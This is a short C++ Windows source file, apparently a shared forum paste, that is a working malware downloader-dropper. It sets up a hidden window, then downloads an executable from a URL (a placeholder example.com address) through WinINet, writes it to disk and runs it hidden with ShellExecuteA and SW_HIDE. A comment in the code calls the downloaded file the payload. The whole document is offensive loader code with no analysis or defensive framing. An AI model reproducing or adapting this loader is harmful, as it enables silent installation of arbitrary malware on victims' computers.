// this is the worst paste ever i done... (100% shit coded...)
// sorry for everything LKJASXFOASJFDSAKHCD
// discord -> walkboat

#include <iostream>
#include <string>
#include <Windows.h>
#include <Wininet.h>

#pragma comment(lib, "Wininet.lib")

LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    // Handle any necessary window messages here
    return DefWindowProc(hWnd, uMsg, wParam, lParam);
}

void DownloadAndExecute(const std::string& url)
{
    const std::string tempFilePath = "program.exe";  // Specify the desired temporary file path

    // Create the Internet session
    HINTERNET hInternet = InternetOpenA("MyApp", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet)
    {
        // Open the URL
        HINTERNET hUrl = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (hUrl)
        {
            // Create the temporary file
            HANDLE hFile = CreateFileA(tempFilePath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile != INVALID_HANDLE_VALUE)
            {
                // Read data from the URL and write it to the file
                char buffer[4096];
                DWORD bytesRead;
                while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0)
                {
                    DWORD bytesWritten;
                    WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL);
                }

                // Close the file
                CloseHandle(hFile);

                // Execute the downloaded payload
                ShellExecuteA(NULL, "open", tempFilePath.c_str(), NULL, NULL, SW_HIDE);
            }

            // Close the URL
            InternetCloseHandle(hUrl);
        }

        // Close the Internet session
        InternetCloseHandle(hInternet);
    }
}

int main()
{
    // Create a window class
    WNDCLASSA wc = {}; 
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = "MyWindowClass";

   
    RegisterClassA(&wc); 


    HWND hWnd = CreateWindowExA(0, "MyWindowClass", "", 0, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, GetModuleHandle(NULL), NULL); 


    std::string url = "https://example.com/program.exe"; // url
    DownloadAndExecute(url);


    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}
